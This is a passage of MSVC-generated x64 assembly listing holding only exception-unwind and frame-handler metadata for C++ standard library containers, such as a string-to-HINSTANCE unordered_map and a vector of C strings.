$unwind$?at@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAAEAPEAUHINSTANCE__@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z DD 010401H
	DD	06204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DB 04H
	DB	'v'
	DB	00H
	DB	0b0H
	DB	04H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DB 04H
	DB	0eH
	DD	imagerel ?dtor$1@?0???0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ@4HA
	DB	02eH
	DD	imagerel ?dtor$2@?0???0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DB 028H
	DD	imagerel $stateUnwindMap$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
	DD	imagerel $ip2state$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DD 020a11H
	DD	07006320aH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z DD 060f01H
	DD	0a640fH
	DD	08340fH
	DD	0700b520fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD 021H
	DD	imagerel $LN52
	DD	imagerel $LN52+69
	DD	imagerel $unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD 060021H
	DD	0af400H
	DD	09e400H
	DD	083400H
	DD	imagerel $LN52
	DD	imagerel $LN52+69
	DD	imagerel $unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD 061621H
	DD	0af416H
	DD	09e40dH
	DD	083405H
	DD	imagerel $LN52
	DD	imagerel $LN52+69
	DD	imagerel $unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD 040801H
	DD	070043208H
	DD	050026003H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DB 04H
	DB	'r'
	DB	00H
	DB	0b0H
	DB	04H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DB 028H
	DD	imagerel $stateUnwindMap$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
	DD	imagerel $ip2state$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DD 020a11H
	DD	07006320aH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@PEBD@std@@QEAAXQEAPEBD_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@QEBA@QEADQEBD_KD@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD 020021H
	DD	0a6400H
	DD	imagerel $LN103
	DD	imagerel $LN103+54
	DD	imagerel $unwind$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD 021H
	DD	imagerel $LN103
	DD	imagerel $LN103+54
	DD	imagerel $unwind$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD 020521H
	DD	0a6405H
	DD	imagerel $LN103
	DD	imagerel $LN103+54
	DD	imagerel $unwind$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z DD 040901H
	DD	0e0053209H
	DD	030027003H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
